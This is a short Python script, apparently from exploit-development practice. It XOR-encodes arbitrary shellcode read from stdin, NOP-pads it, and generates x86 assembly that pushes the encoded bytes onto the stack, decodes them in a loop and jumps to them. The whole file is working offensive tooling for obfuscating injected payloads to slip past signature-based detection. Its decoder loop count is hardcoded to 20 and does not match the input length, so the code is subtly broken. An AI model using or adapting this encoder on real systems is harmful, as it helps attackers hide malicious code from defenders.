import sys

shellcode = bytearray(sys.stdin.read())
encoded_shellcode = ""
print(";Len of shellcode received: %d"%len(shellcode))

if len(shellcode)%4 != 0:
    shellcode += bytearray("\x90" * (4 - len(shellcode)%4))
    print (";Len of shellcode after NOP addition: %d"%len(shellcode))

xor_shellcode = bytearray("")

xor = 0xaa

for item in shellcode:
    xor_shellcode.append(xor^item)

rev = ""

for item in xor_shellcode[::-1]:
    rev += "%02x"%item

encoded_shellcode += (
"""global _start\n"""
"""section .text\n\n"""
"""_start:\n"""
)

for item in map("".join,zip(*[iter(rev)]*8)):
    encoded_shellcode += "push 0x"+item+"\n"

encoded_shellcode += (
"""mov esi,esp\n"""
"""xor ecx,ecx\n"""
"""mov cl,20\n"""
"""mov ebx,0xaaaaaaaa\n\n"""
"""decoder:\n"""
"""xor dword [esi], ebx\n"""
"""add esi, 4\n"""
"""loop decoder\n"""
"""jmp esp\n"""
)

print(encoded_shellcode)
